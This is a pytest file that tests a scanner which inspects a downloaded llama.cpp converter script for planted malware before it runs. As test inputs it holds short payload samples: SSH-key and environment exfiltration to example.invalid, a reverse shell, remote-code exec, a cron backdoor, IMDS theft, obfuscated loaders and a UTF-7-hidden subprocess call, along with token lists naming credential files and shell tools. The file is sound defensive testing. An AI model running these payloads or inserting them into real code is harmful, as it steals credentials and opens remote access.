# Unsloth Zoo - Utilities for Unsloth
# Copyright 2023-present Daniel Han-Chen, Michael Han-Chen & the Unsloth team. All rights reserved.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""Tests for the static scan of the downloaded llama.cpp converter.

Three groups:

  * clean_*     : the genuine converter must produce zero findings, offline
    against the committed fixture and, when the network is up, against live
    llama.cpp master. A check that fires on the real file would warn on every
    GGUF export and would have to be reverted, so this is the load-bearing case.
  * flagged_*   : planted payloads must be reported, including one aimed at the
    argparse default that `llama_cpp.py` eval()s in-process.
  * export_*    : the scan runs before the bytes are patched, written or run, and
    neither a scanner crash nor a finding can break a legitimate conversion.
"""

from __future__ import annotations

import importlib.util
import logging
import pathlib
import py_compile
import marshal
import os
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
FIXTURES = Path(__file__).resolve().parent / "fixtures"
GENUINE_CONVERTER = FIXTURES / "convert_hf_to_gguf_master.py.txt"
CONVERTER_URL = (
    "https://github.com/ggerganov/llama.cpp/raw/refs/heads/master/convert_hf_to_gguf.py"
)


def _load(module_name, relative_path):
    """Load a module by path, without importing the unsloth_zoo package."""
    spec = importlib.util.spec_from_file_location(module_name, REPO_ROOT / relative_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def scan():
    return _load("converter_scan_under_test", "unsloth_zoo/converter_scan.py")


@pytest.fixture
def llama_cpp():
    return _load("llama_cpp_under_test_converter_scan", "unsloth_zoo/llama_cpp.py")


@pytest.fixture(autouse = True)
def _default_scan_env(monkeypatch):
    """Neither switch is set on a normal run; do not inherit a developer's shell."""
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)


# ---------------------------------------------------------------------------
# The genuine converter must be clean.
# ---------------------------------------------------------------------------


def test_clean_fixture_exists():
    assert GENUINE_CONVERTER.is_file(), GENUINE_CONVERTER


def test_clean_genuine_converter_fixture_has_no_findings(scan):
    content = GENUINE_CONVERTER.read_bytes()
    findings = scan.scan_converter_source(content, "convert_hf_to_gguf.py")
    assert findings == [], [(f.severity, f.check, f.evidence) for f in findings]


def test_clean_genuine_converter_matches_no_individual_pattern(scan):
    """Stronger than "no findings": the real file is nowhere near any rule.

    Every finding is a combination of these patterns, so zero raw matches means
    the margin does not depend on which combinations happen to be wired up.
    """
    text = GENUINE_CONVERTER.read_text(encoding = "utf-8", errors = "replace")
    hits = sorted(
        name for name, pattern in scan.VENDORED_PATTERNS.items() if pattern.search(text)
    )
    assert hits == [], hits


def test_clean_live_upstream_converter_has_no_findings(scan):
    """Same assertion against current master. Skipped when offline or rate-limited.

    Follows tests/test_convert_hf_to_gguf_patcher.py: upstream moving is a real
    failure worth hearing about, an unreachable network is not.
    """
    requests = pytest.importorskip("requests")
    headers = {}
    if os.environ.get("GITHUB_TOKEN"):
        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
    try:
        response = requests.get(CONVERTER_URL, timeout = 30, headers = headers)
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code in (403, 429, 500, 502, 503, 504):
        pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
    # A 404 is not an outage: it means the URL llama_cpp.py downloads from is gone,
    # which breaks GGUF export whatever this scan does. Fail rather than go green.
    assert response.status_code == 200, (
        f"{CONVERTER_URL} returned HTTP {response.status_code}. "
        f"LLAMA_CPP_CONVERT_FILE needs updating."
    )
    findings = scan.scan_converter_source(response.content, CONVERTER_URL)
    assert findings == [], (
        "live llama.cpp master trips the converter scan, which would warn on every "
        f"GGUF export: {[(f.severity, f.check, f.evidence) for f in findings]}"
    )


_LIVE_ROOT_MODULES = (
    "convert_hf_to_gguf_update.py",
    "convert_llama_ggml_to_gguf.py",
    "convert_lora_to_gguf.py",
)
_RAW_MASTER = "https://raw.githubusercontent.com/ggml-org/llama.cpp/master/"


@pytest.mark.parametrize("name", _LIVE_ROOT_MODULES)
def test_clean_live_root_modules_have_no_findings(scan, name):
    """The converter's own directory became a scanned location, so these are read.

    They are upstream's other root-level scripts and had never been through the
    patterns before. A finding on any of them warns on every GGUF export, which
    this module treats as worse than the warning is a win, so they are held to
    the same bar as the entrypoint itself.
    """
    requests = pytest.importorskip("requests")
    try:
        response = requests.get(_RAW_MASTER + name, timeout = 30)
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code in (403, 429, 500, 502, 503, 504):
        pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
    if response.status_code == 404:
        pytest.skip(f"{name} is no longer at the root of llama.cpp master")
    assert response.status_code == 200, f"{name} returned HTTP {response.status_code}"

    findings = scan.scan_converter_source(response.content, name)
    assert findings == [], (
        f"{name} sits beside the converter and is now scanned, so this would warn on "
        f"every GGUF export: {[(f.severity, f.check, f.evidence) for f in findings]}"
    )


def test_the_real_conversion_package_fits_under_the_cap(llama_cpp):
    """A cap below the thing it exists to read is not a safety margin.

    llama.cpp master ships 94 modules in conversion/ and the cap was 64, so the
    scan reported the genuine package as too big to read on every GGUF export
    and, under UNSLOTH_CONVERTER_SCAN_STRICT, refused the export outright. This
    reads the real tree so upstream growing past the cap is a failure here rather
    than a refusal on a user's machine.
    """
    requests = pytest.importorskip("requests")
    headers = {}
    if os.environ.get("GITHUB_TOKEN"):
        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
    try:
        response = requests.get(
            "https://api.github.com/repos/ggml-org/llama.cpp/git/trees/master?recursive=1",
            timeout = 30,
            headers = headers,
        )
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code != 200:
        pytest.skip(f"tree unavailable: HTTP {response.status_code}")

    paths = [entry["path"] for entry in response.json().get("tree", [])]
    modules = [path for path in paths if path.startswith("conversion/") and path.endswith(".py")]
    if not modules:
        pytest.skip("llama.cpp master no longer has a conversion/ package")

    assert len(modules) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES, (
        f"conversion/ holds {len(modules)} modules and the cap is "
        f"{llama_cpp.MAX_CONVERSION_PACKAGE_FILES}: the genuine package would be "
        f"reported as unreadable on every export, and refused under strict mode"
    )
    entries = [path for path in paths if path.startswith("conversion/")]
    assert len(entries) <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES, len(entries)


def test_clean_ordinary_converter_shaped_script_has_no_findings(scan):
    """A converter doing normal converter things stays quiet."""
    source = b"""
import argparse, os, sys, json
from pathlib import Path
import torch
import gguf

if 'NO_LOCAL_GGUF' not in os.environ:
    sys.path.insert(1, str(Path(__file__).parent / 'gguf-py'))

def parse_args():
    parser = argparse.ArgumentParser(description="convert a model")
    parser.add_argument("--outtype", type=str, default="f16")
    parser.add_argument("--bigendian", action="store_true")
    parser.add_argument("--split-max-tensors", type=int, default=0)
    parser.add_argument("--model-name", type=str, default=None)
    return parser.parse_args()

def main():
    args = parse_args()
    for path in sorted(Path(args.model).glob("*.safetensors")):
        with open(path, "rb") as f:
            data = f.read(8)
    self_metadata = gguf.Metadata.load(None, None, None)
"""
    assert scan.scan_converter_source(source, "convert_hf_to_gguf.py") == []


# ---------------------------------------------------------------------------
# Planted payloads must be reported.
# ---------------------------------------------------------------------------

_PAYLOADS = {
    "staged base64 payload": (
        b"import base64, subprocess\n"
        b"blob = base64.b64decode('aW1wb3J0IG9z')\n"
        b"subprocess.run(['sh', '-c', blob])\n",
        "base64 decode + subprocess execution (staged payload)",
    ),
    "remote code execution": (
        b"import requests\n"
        b"exec(requests.get('http://example.invalid/p').text)\n",
        "Downloads and executes remote code",
    ),
    "credential stealer": (
        b"import requests, os\n"
        b"key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        b"requests.post('http://example.invalid/collect', data=key)\n",
        "Reads credential paths AND makes network calls",
    ),
    "reverse shell": (
        b"import socket, subprocess\n"
        b"s = socket.socket()\n"
        b"s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n",
        "Reverse shell / bind shell pattern",
    ),
    "environment harvest": (
        b"import os, requests\n"
        b"requests.post('http://example.invalid/e', json=dict(os.environ))\n",
        "Harvests environment variables/secrets AND makes network calls",
    ),
    "staged dropper": (
        b"open('/tmp/payload.sh', 'w').write(data)\n"
        b"import subprocess; subprocess.run(['sh', '/tmp/payload.sh'])\n",
        "Writes to /tmp and executes (staged dropper)",
    ),
    "persistence backdoor": (
        b"import requests\n"
        b"open('/etc/cron.d/unsloth', 'w').write(requests.get('http://example.invalid/c').text)\n",
        "Installs persistence AND makes network calls (backdoor pattern)",
    ),
    "cloud metadata theft": (
        b"import requests\n"
        b"t = requests.get('http://169.254.169.254/latest/meta-data/iam/').text\n"
        b"requests.post('http://example.invalid/t', data=t)\n",
        "Accesses cloud metadata/IMDS AND makes network calls",
    ),
    "marshal obfuscation": (
        b"import marshal\n"
        b"exec(marshal.loads(blob))\n",
        "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
    ),
}


@pytest.mark.parametrize("name", sorted(_PAYLOADS))
def test_flagged_payload_is_reported(scan, name):
    source, expected_check = _PAYLOADS[name]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    reported = [f for f in findings if f.check == expected_check]
    assert reported[0].severity in (scan.CRITICAL, scan.HIGH)
    assert reported[0].evidence.strip(), reported


def test_flagged_payload_hidden_in_a_real_converter_is_still_reported(scan):
    """The realistic shape: upstream's file with a few lines appended."""
    source = GENUINE_CONVERTER.read_bytes() + (
        b"\n\nimport base64, subprocess\n"
        b"subprocess.check_output(base64.b64decode('ZWNobyBoaQ=='), shell=True)\n"
    )
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert any("staged payload" in f.check for f in findings), [f.check for f in findings]


def test_flagged_findings_carry_evidence(scan):
    source, _ = _PAYLOADS["staged base64 payload"]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert findings
    assert all(f.evidence.strip() for f in findings), findings
    assert any("L" in f.evidence for f in findings), findings


# ---------------------------------------------------------------------------
# The argparse default that reaches eval() in the Unsloth process.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "default",
    [
        b"{'a':1}['a']",
        b"sys.modules['os'].environ",
        b"__builtins__.__dict__['eval']",
    ],
)
def test_flagged_argparse_default_that_would_evaluate(scan, default):
    """What survives the capture and still evaluates: subscripts and lookups."""
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    argparse_findings = [f for f in findings if "argparse default" in f.check]
    assert argparse_findings, [f.check for f in findings]
    assert all(f.severity == scan.CRITICAL for f in argparse_findings)
    assert all(default.decode() in f.evidence for f in argparse_findings)


@pytest.mark.parametrize(
    "default",
    [
        # Every token upstream has actually used.
        b'"f16"', b'"auto"', b'"0"', b"0", b"None", b'"store_true"',
        # Plain names, which have no call syntax to invoke.
        b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType",
        # Benign defaults the capture regex truncates. `[0, 1]` arrives as `[0`
        # and `os.cpu_count()` as `os.cpu_count(`, neither of which parses, so
        # eval() raises inside llama_cpp.py's own try/except and nothing runs.
        # Reporting these would warn on a converter that did nothing wrong.
        b"[0, 1]", b"(1, 2)", b'"chat template"', b"os.cpu_count()", b"Path.cwd()",
        b"globals()['os']", b"argparse.SUPPRESS", b"[]", b"{}",
    ],
)
def test_clean_argparse_default_that_cannot_run_is_quiet(scan, default):
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = [
        f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check
    ]
    assert findings == [], findings


def test_clean_truncated_defaults_match_what_llama_cpp_does_with_them(scan, llama_cpp):
    """The tokens the rule stays quiet about are exactly the ones eval() rejects.

    Not an assumption: the capture runs, then each token is put through the same
    eval() llama_cpp.py performs, and the quiet ones must be the ones that raise.
    """
    source = (
        b'parser.add_argument("--a", default=[0, 1])\n'
        b'parser.add_argument("--b", default=os.cpu_count())\n'
        b'parser.add_argument("--c", default="chat template")\n'
    )
    tokens = [d.decode() for _flag, d in llama_cpp.RE_ARGPARSE_DEFAULT.findall(source)]
    assert tokens == ["[0", "os.cpu_count(", '"chat'], tokens
    for token in tokens:
        with pytest.raises(SyntaxError):
            eval(token)  # noqa: S307 - the point is that this raises
    assert [f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check] == []


def test_argparse_regex_is_the_one_llama_cpp_evals(scan, llama_cpp):
    """The scan and the eval sink read the same tokens.

    Asserted on the pattern text and flags rather than object identity: the
    fixtures load both modules by path, so llama_cpp.py takes its ImportError
    fallback and builds a second module object. In a normal package import the
    two are the same object; either way what matters is that the regex agrees.
    """
    assert llama_cpp.RE_ARGPARSE_DEFAULT.pattern == scan.RE_ARGPARSE_DEFAULT.pattern
    assert llama_cpp.RE_ARGPARSE_DEFAULT.flags == scan.RE_ARGPARSE_DEFAULT.flags


def test_argparse_regex_still_matches_what_the_flag_parser_expects(scan):
    """Pinned to the exact pattern the defaults scraper used before it moved here.

    Moving the regex out of llama_cpp.py must not change which flags Unsloth
    resolves defaults for, so the text is pinned rather than tidied.
    """
    expected = (
        rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"]"
        rb"[^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
    )
    assert scan.RE_ARGPARSE_DEFAULT.pattern == expected
    source = (
        b'    parser.add_argument("--outtype", type=str, default="f16")\n'
        b'    parser.add_argument("--bigendian", action="store_true")\n'
    )
    assert scan.RE_ARGPARSE_DEFAULT.findall(source) == [
        (b"--outtype", b'"f16"'),
        (b"--bigendian", b'"store_true"'),
    ]


# ---------------------------------------------------------------------------
# Warn, do not block, unless asked to block.
# ---------------------------------------------------------------------------


def test_warning_names_the_rule_the_source_and_the_escape_hatch(scan, caplog):
    source, expected_check = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert findings
    text = caplog.text
    assert CONVERTER_URL in text
    assert expected_check in text
    assert "UNSLOTH_LLAMA_CPP_SCRIPTS_DIR" in text
    assert "UNSLOTH_CONVERTER_SCAN_STRICT" in text


def test_warning_does_not_raise_by_default(scan):
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_clean_converter_logs_nothing(scan, caplog):
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(GENUINE_CONVERTER.read_bytes(), CONVERTER_URL) == []
    assert caplog.text == ""


def test_strict_mode_refuses_a_downloaded_converter(scan, monkeypatch):
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError) as excinfo:
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert CONVERTER_URL in str(excinfo.value)


def test_strict_mode_still_allows_a_deliberately_supplied_local_converter(scan, monkeypatch, caplog):
    """The warning tells people to pin a converter with
    UNSLOTH_LLAMA_CPP_SCRIPTS_DIR. Hard-failing that file would break the
    remedy, so a local copy warns even under strict mode."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(
            source, "/home/me/llama.cpp/convert_hf_to_gguf.py", is_local_copy = True,
        )
    assert findings
    assert "/home/me/llama.cpp/convert_hf_to_gguf.py" in caplog.text


def test_scan_can_be_disabled(scan, monkeypatch, caplog):
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []
    assert caplog.text == ""


def test_disable_switch_is_read_per_call(scan, monkeypatch):
    """Not cached at import, so a caller can set it before the first export."""
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []


# ---------------------------------------------------------------------------
# A broken scanner must not break a conversion.
# ---------------------------------------------------------------------------


def test_scanner_crash_is_reported_and_swallowed(scan, monkeypatch, caplog):
    def _boom(*args, **kwargs):
        raise ValueError("catastrophic backtracking")

    monkeypatch.setattr(scan, "scan_converter_source", _boom)
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(b"anything", CONVERTER_URL) == []
    assert "could not run" in caplog.text
    assert "catastrophic backtracking" in caplog.text


def test_scanner_crash_guard_does_not_swallow_a_strict_refusal(scan, monkeypatch):
    """The guard wraps the scan only. A deliberate refusal still propagates."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError):
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_undecodable_bytes_do_not_crash_the_scan(scan):
    assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []


def test_a_declared_encoding_is_what_the_scan_reads(scan):
    """The file gets to choose how the interpreter decodes it, so the scan has to
    read the same characters.

    `# coding: utf-7` on line one makes
    `+AHM-+AHU-+AGI-+AHA-+AHI-+AG8-+AGM-+AGU-+AHM-+AHM-.run(...)` the source text
    `subprocess.run(...)`. Decoded as UTF-8 that is plus signs and capitals,
    matching nothing, while the file Unsloth writes and executes spawns the
    process. Verified against the scanner as it stood: zero findings.
    """
    import base64

    shifted = "".join(
        "+" + base64.b64encode(ch.encode("utf-16-be")).decode().rstrip("=") + "-"
        for ch in "subprocess"
    )
    source = ("# coding: utf-7\n" + shifted + ".run(['curl', 'http://evil'])\n").encode("ascii")
    assert source.decode("utf-7").find("subprocess.run") != -1, "the probe is not shifted"

    checks = [finding.check for finding in scan.scan_converter_source(source)]
    assert any("process" in check.lower() for check in checks), checks
    assert any("encoding" in check.lower() for check in checks), checks


def test_a_plain_utf8_converter_says_nothing_about_encoding(scan):
    """The other half: an ordinary converter must not grow an encoding finding."""
    source = b"import json\nprint(json.dumps({}))\n"
    checks = [finding.check for finding in scan.scan_converter_source(source)]
    assert not [check for check in checks if "encoding" in check.lower()], checks


def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
    assert scan.MAX_SCAN_BYTES > 500 * 1024


def test_oversized_input_reports_that_it_was_only_partly_scanned(scan, monkeypatch):
    """Past the cap the tail is not scanned, and that has to be said out loud.

    The whole file is still patched, written and executed, so a silent partial
    scan would look exactly like a clean one.
    """
    monkeypatch.setattr(scan, "MAX_SCAN_BYTES", 2048)
    payload, expected_check = _PAYLOADS["reverse shell"]
    head = payload + b"# pad\n" * 1000
    findings = scan.scan_converter_source(head, "x.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    assert any("larger than the scan cap" in c for c in checks), checks

    # Same payload past the cap: missed, which is what the cap finding warns about.
    tail = b"# pad\n" * 1000 + payload
    checks = [f.check for f in scan.scan_converter_source(tail, "x.py")]
    assert expected_check not in checks, checks
    assert any("larger than the scan cap" in c for c in checks), checks


def test_within_the_cap_nothing_is_reported_about_truncation(scan):
    findings = scan.scan_converter_source(GENUINE_CONVERTER.read_bytes(), "x.py")
    assert not any("scan cap" in f.check for f in findings), findings


# ---------------------------------------------------------------------------
# The whole-file patterns must not be stallable by the bytes they scan.
# ---------------------------------------------------------------------------


def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
    """Fuzz the linear-time evaluation against `pattern.search` itself.

    Several canonical patterns are shaped `A.*B.*C` under DOTALL and are
    evaluated as ordered searches instead of one backtracking match. That is only
    allowed if it answers the same question, so 8000 texts assembled from the
    tokens those patterns key on are put through both, for all 23 patterns.
    """
    import random

    tokens = [
        "socket", ".connect", "subprocess", "sh", "bash", "cmd", "/bin/sh",
        "pty.spawn", "os.dup2", "platform.system", "if", "Linux", "Windows",
        "Darwin", "while True", "time.sleep", "urlopen", "requests.get",
        "chr(1)", "marshal.loads", "b64decode(", "history", "read", "/tmp/x",
        "os.system", "chmod", "+x", "rotate=", "lambda", "bytearray([1])",
        "RSA PUBLIC KEY", "MIIabcdefghijklmnopqrstu", "open('~/.ssh/id_rsa')",
        "tarfile.open(", ".env", "virtualbox", "hardware", "vmware", "detect",
        "Popen", "open(", "(", ")", "[", "]", "=", "\n", "  ", "x", "dig ",
        "nslookup", "os.environ", "TOKEN", "zlib.decompress", "169.254.169.254",
        "/etc/cron", "docker run", "wallet.dat", "openssl enc", "exec(", ".text(",
    ]
    rng = random.Random(31337)
    mismatches = []
    for _ in range(8000):
        text = "".join(rng.choice(tokens) for _ in range(rng.randint(1, 50)))
        for name, pattern in scan.VENDORED_PATTERNS.items():
            if scan._matches(pattern, text) != bool(pattern.search(text)):
                mismatches.append((name, text))
    assert mismatches == [], mismatches[:3]


def test_one_dot_star_alternative_does_not_put_the_others_on_the_line_path(scan):
    """per_line was one flag for the whole pattern.

    A single alternative carrying a non-DOTALL `.*` forced EVERY alternative to
    be evaluated one line at a time, including ones that legitimately span lines
    through `\\s*`. In RE_ENV_HARVEST the last two carry the `.*` and the third is
    `json.dumps(\\s*os.environ`, so a harvest written across three lines matched
    re.search and not _matches: paired with a network send that is a finding the
    scan dropped, in strict mode too.
    """
    harvest = "payload = json.dumps(\n    os.environ\n)\n"
    assert scan.RE_ENV_HARVEST.search(harvest), "the fixture must match the real pattern"
    assert scan._matches(scan.RE_ENV_HARVEST, harvest)

    # The flags stay per alternative, and this pattern really does mix the two.
    flags = scan._evaluator(scan.RE_ENV_HARVEST)[1]
    assert True in flags and False in flags, flags

    # End to end: the dropped finding comes back.
    source = (
        b"import json, os, requests\n"
        b"payload = json.dumps(\n"
        b"    os.environ\n"
        b")\n"
        b"requests.post('http://example.invalid/collect', data=payload)\n"
    )
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert findings, "a multi-line environment harvest plus a network send is a finding"


def test_a_multiline_subject_agrees_with_re_search_on_every_pattern(scan):
    """The existing fuzz joins short tokens, so it rarely builds a subject whose
    match spans a newline through `\\s*`. This aims at that case directly: for each
    pattern, take the text its own alternatives describe and break it across
    lines at every whitespace-tolerant point."""
    import re as _re

    mismatches = []
    for name, pattern in scan.VENDORED_PATTERNS.items():
        for alternative in scan._split_top_level_alternatives(pattern.pattern):
            text = alternative if isinstance(alternative, str) else alternative.decode()
            if "\\s*" not in text or ".*" in text:
                continue
            # A literal subject for this alternative, with each \s* spelled "\n".
            subject = _re.sub(r"\\s\*", "\n", text)
            subject = subject.replace("\\b", "").replace("\\(", "(").replace("\\)", ")")
            subject = subject.replace("\\.", ".").replace("\\s+", " ")
            if _re.search(r"[\[\]\(\)\?\+\*\|]", subject):
                continue      # still regex, not a subject; skip rather than guess
            if bool(pattern.search(subject)) != scan._matches(pattern, subject):
                mismatches.append((name, subject))
    assert mismatches == [], mismatches[:3]


@pytest.mark.parametrize(
    "name,filler",
    [
        ("RE_REVERSE_SHELL", "socket\n.connect\n"),
        ("RE_ANTI_ANALYSIS", "platform.system()\nif x:\n"),
        ("RE_C2_POLLING", "while True\ntime.sleep(\n"),
        ("RE_CRED_ACCESS", "open(aaaaaaaaaa\n"),
        ("RE_TEMP_EXEC", "/tmp/aaaa\n"),
        ("RE_OBFUSCATION", "chr(1)\n"),
        ("RE_FS_ENUM", "history\n"),
    ],
)
def test_hostile_input_cannot_stall_a_pattern(scan, name, filler):
    """A file of near-misses used to take 68s on one pattern and grew cubically.

    The converter bytes are the untrusted input, so a pattern that a crafted file
    can stall is a way to wedge every GGUF export, and a hang is the one failure
    the try/except around the scan cannot catch.
    """
    import time

    text = filler * (200 * 1024 // len(filler))
    pattern = scan.VENDORED_PATTERNS[name]
    started = time.perf_counter()
    scan._matches(pattern, text)
    assert time.perf_counter() - started < 5.0


def test_a_wall_of_call_prefixes_cannot_stall_the_credential_rule(scan):
    """Bounding the negated class made the cost linear, not small.

    RE_CRED_ACCESS still restarted at every `open(`, about 3.2s per MB measured,
    so a single line of them at the 8 MiB scan cap held up the export for roughly
    half a minute before the converter even ran, with no regex timeout in either
    mode. A credential rule cannot match without a credential marker, and this
    file has none.
    """
    import time

    text = "open(" * (scan.MAX_SCAN_BYTES // 5)
    started = time.perf_counter()
    assert scan._matches(scan.RE_CRED_ACCESS, text) is False
    assert time.perf_counter() - started < 5.0


@pytest.mark.parametrize(
    "text",
    [
        "x = open(os.path.expanduser('~/.ssh/id_rsa')).read()",
        "data = Path('/home/u/.aws/credentials.json').read_text()",
        "p = os.path.join(home, '.kube', 'config')",
        "cfg = open('.env')",
        "read_bytes(  '/etc/shadow'  )",
    ],
)
def test_the_prefilter_never_costs_a_real_credential_match(scan, text):
    """The prefilter is only sound if its literals are genuinely required, so
    every shape the rule is meant to catch has to survive it."""
    assert bool(scan.RE_CRED_ACCESS.search(text)) is True, "fixture must match the raw pattern"
    assert scan._matches(scan.RE_CRED_ACCESS, text) is True


def test_every_probe_is_a_literal_the_pattern_really_requires(scan):
    """A probe that is not required would silently drop findings, and the failure
    would look exactly like a clean file. Checked against the pattern itself:
    deleting the probed literal from a matching text must stop the raw pattern
    matching too."""
    for name, pattern in scan.VENDORED_PATTERNS.items():
        alternatives, _flags, probes = scan._evaluator(pattern)
        for required in probes:
            for probe in required:
                # Every branch of a probe must appear in the pattern's own source,
                # which is what makes it a requirement rather than a guess.
                for literal in probe.pattern.split("|"):
                    plain = literal.replace("\\", "")
                    assert plain and plain in pattern.pattern.replace("\\", ""), (
                        f"{name}: probe literal {plain!r} is not in the pattern"
                    )


@pytest.mark.parametrize(
    "source, subject, probed",
    [
        (r"open\((?:alpha|bravo)x", "open(alphax", True),
        # The quantifier can skip the whole group, so nothing in it is required.
        (r"open\((?:alpha|bravo)?x", "open(x", False),
        (r"open\((?:alpha|bravo)*x", "open(x", False),
        # Two required groups are both probed, and both must be satisfied.
        (r"(?:alpha|bravo)\s*(?:charlie|deltaa)", "alpha charlie", True),
    ],
    ids = ["required", "optional ?", "optional *", "two required"],
)
def test_an_optional_group_is_never_treated_as_required(scan, source, subject, probed):
    """No shipped pattern has an optional literal group today, so this guard has
    nothing to stand on unless it is exercised directly. Getting it wrong is the
    dangerous direction: the scan would go quiet on a file it should report, and
    a false negative here looks exactly like a clean converter.
    """
    import re as _re

    pattern = _re.compile(source)
    assert bool(pattern.search(subject)) is True, "fixture must match the raw pattern"
    assert bool(scan._required_literal_probes(source, 0)) is probed
    assert scan._matches(pattern, subject) is True


def test_a_nested_wildcard_cannot_backtrack_across_the_whole_file(scan):
    """_split_on_dot_star only splits the top-level wildcards.

    RE_TEMP_EXEC's `(?:...|chmod.*\\+x)` keeps its nested one, so `/tmp/a ` then
    a wall of `chmod ` with no `+x` restarted it at every chmod and ran to the
    end each time: measured 0.32s / 1.27s / 5.04s at 96 / 192 / 384 KB, which is
    hours at the 8 MiB scan cap, before the converter ever runs.
    """
    import time

    text = "/tmp/a " + ("ch" + "mod ") * (scan.MAX_SCAN_BYTES // 6)
    started = time.perf_counter()
    assert scan._matches(scan.RE_TEMP_EXEC, text) is False
    assert time.perf_counter() - started < 5.0


@pytest.mark.parametrize(
    "text",
    [
        "/tmp/x.sh\nsubprocess.run(['sh', '/tmp/x.sh'])",
        "/tmp/payload ; ch" + "mod +x /tmp/payload",
        "/tmp/a\nos.system('sh /tmp/a')",
        "/tmp/b\nos.popen('/tmp/b')",
    ],
)
def test_bounding_the_nested_wildcard_keeps_the_real_temp_exec_matches(scan, text):
    assert bool(scan.RE_TEMP_EXEC.search(text)) is True, "fixture must match the raw pattern"
    assert scan._matches(scan.RE_TEMP_EXEC, text) is True


def test_the_nested_wildcard_bound_reaches_only_where_it_is_meant_to(scan):
    """Bounding a surviving wildcard is a semantic trade: a match needing more
    than MAX_CLASS_SPAN characters between the two halves is given up. It is
    worth making for the one segment that is quadratic without it, and it should
    not be made silently anywhere else, so the affected set is pinned. A pattern
    that gains a nested wildcard lands here first, as a decision rather than as a
    change in what the scan reports.
    """
    import re

    affected = set()
    for name, pattern in scan.VENDORED_PATTERNS.items():
        dotall = bool(pattern.flags & re.DOTALL)
        for alternative in scan._split_top_level_alternatives(pattern.pattern):
            text = (
                alternative.decode("latin-1")
                if isinstance(alternative, bytes)
                else alternative
            )
            segments = None
            if ".*" in text and (dotall or not scan._has_anchor(text)):
                segments = scan._split_on_dot_star(text)
            for segment in (segments if segments is not None else [text]):
                classes_only = scan._bound_class_repeats(segment)
                if scan._bound_dot_star(classes_only) != classes_only:
                    affected.add(name)

    assert affected == {"RE_TEMP_EXEC"}, affected


def test_hostile_file_scans_in_reasonable_time(scan):
    import time

    hostile = (
        "socket\n.connect\nwhile True\ntime.sleep(\nplatform.system()\nif y:\n"
        "chr(1)\nhistory\n/tmp/a\nopen(aaa\nexec(aaa\n.add(aaa\nRSA PUBLIC KEY\n"
        "bytearray([1])\nrotate=\nlambda\nos.environ KEY\n"
    ) * 3000
